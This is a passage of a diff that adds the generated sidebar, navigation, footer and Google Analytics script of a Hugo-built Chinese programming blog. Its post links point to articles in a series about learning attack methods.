+  <a class="sidebar-toggle" title="Expand Sidebar"><i class="fa icon-sidebar-toggle"></i></a>
+  <div class="sidebar-content">
+    <div class="sidebar-top group">
+      <p>Follow:</p>
+      <ul class="social-links">
+    <li>
+    <a class="social-tooltip" title="On WeiBo"
+        href="http://weibo.com/coderzh" target="_blank">
+        <i class="fa fa-weibo"></i>
+    </a>
+    </li>
+    <li>
+    <a class="social-tooltip" title="On Twitter" rel="nofollow"
+        href="https://twitter.com/coderzh" target="_blank">
+        <i class="fa fa-twitter"></i>
+    </a>
+    </li>
+    <li>
+    <a class="social-tooltip" title="On GitHub"
+        href="https://github.com/coderzh" target="_blank">
+        <i class="fa fa-github"></i>
+    </a>
+    </li>
+</ul>
+
+    </div>
+    <div class="widget qrcode">
+    <img src="http://blog.coderzh.com/public/qrcode.jpg" alt="qrcode" width="172px" height="172px"/>
+    <p>微信扫一扫：<br/> 关注我的公众号： <br /> hacker-thinking</p>
+</div>
+
+    <ul class="post-nav group">
+      <li class="next">
+        
+        <a href="http://blog.coderzh.com/2008/09/06/1285693/" rel="next">
+          <i class="fa fa-chevron-right"></i>
+          <strong>Next post</strong>
+          <span>(原创)攻击方式学习之(3) - 缓冲区溢出(Buffer Overflow)</span>
+        </a>
+        
+      </li>
+      <li class="previous">
+        
+        <a href="http://blog.coderzh.com/2008/09/06/1285500/" rel="prev">
+          <i class="fa fa-chevron-left"></i>
+          <strong>Previous Post</strong>
+          <span>(原创)攻击方式学习之(1) - 跨站式脚本(Cross-Site Scripting)</span>
+        </a>
+        
+      </li>
+    </ul>
+    <div id="search-2" class="widget widget_search"><h3>Search</h3>
+      <form method="get" class="searchform themeform" action="https://www.google.com/search">
+        <div>
+          <input type="text" class="search" name="q" placeholder="Press enter to start searching">
+        </div>
+      </form>
+    </div>
+  </div>
+  
+</div>
+
+          <div class="sidebar s2">
+  <a class="sidebar-toggle" title="Expand Sidebar"><i class="fa icon-sidebar-toggle"></i></a>
+  <div class="sidebar-content">
+    <div class="sidebar-top group">
+      <p>More</p>
+    </div>
+    <div id="categories-2" class="widget widget_categories"><h3>Categories</h3>
+      <ul>
+        
+          <li class="cat-item cat-item-1">
+            <a rel="nofollow" href="http://blog.coderzh.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a>
+          </li>
+        
+          <li class="cat-item cat-item-1">
+            <a rel="nofollow" href="http://blog.coderzh.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
+          </li>
+        
+          <li class="cat-item cat-item-1">
+            <a rel="nofollow" href="http://blog.coderzh.com/categories/%E6%80%9D%E8%80%83%E6%84%9F%E6%82%9F/">思考感悟</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+  <footer id="footer">
+
+  <nav class="nav-container group" id="nav-footer">
+    <div class="nav-toggle"><i class="fa fa-bars"></i></div>
+    <div class="nav-text"></div>
+    <div class="nav-wrap">
+      <ul id="menu-default-menu-1" class="nav container group">
+        <li class="menu-item menu-item-type-post_type menu-item-object-page">
+          <a rel="nofollow" href="http://blog.coderzh.com/">首页</a>
+        </li>
+        
+        <li class="menu-item menu-item-type-post_type menu-item-object-page">
+          <a rel="nofollow" href="http://blog.coderzh.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a>
+        </li>
+        
+        <li class="menu-item menu-item-type-post_type menu-item-object-page">
+          <a rel="nofollow" href="http://blog.coderzh.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
+        </li>
+        
+        <li class="menu-item menu-item-type-post_type menu-item-object-page">
+          <a rel="nofollow" href="http://blog.coderzh.com/categories/%E6%80%9D%E8%80%83%E6%84%9F%E6%82%9F/">思考感悟</a>
+        </li>
+        
+      </ul>
+    </div>
+  </nav>
+  
+
+  <section class="container" id="footer-bottom">
+    <div class="container-inner">
+      <a id="back-to-top" href="#"><i class="fa fa-angle-up"></i></a>
+      <div class="pad group">
+        <div class="grid one-half">
+          <div id="copyright">
+            <p>Copyright © 2015. All Rights Reserved. <br>Powered by
+              <a rel="nofollow" href="http://gohugo.io/" target="_blank">Hugo - the static site generator</a>.
+              <a rel="nofollow" href="http://golang.org" target="_blank">#golang</a>.
+            </p>
+          </div>
+          
+        </div>
+        
+        <div class="grid one-half last">
+          <ul class="social-links">
+    <li>
+    <a class="social-tooltip" title="On WeiBo"
+        href="http://weibo.com/coderzh" target="_blank">
+        <i class="fa fa-weibo"></i>
+    </a>
+    </li>
+    <li>
+    <a class="social-tooltip" title="On Twitter" rel="nofollow"
+        href="https://twitter.com/coderzh" target="_blank">
+        <i class="fa fa-twitter"></i>
+    </a>
+    </li>
+    <li>
+    <a class="social-tooltip" title="On GitHub"
+        href="https://github.com/coderzh" target="_blank">
+        <i class="fa fa-github"></i>
+    </a>
+    </li>
+</ul>
+
+        </div>
+      </div>
+
+    </div>
+    
+  </section>
+  
+
+</footer>
+
+</div>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-10147768-2', 'auto');
+  ga('send', 'pageview');
+
+  $('#messagesbsb').remove();
+
+</script>
+</body>
+</html>
+
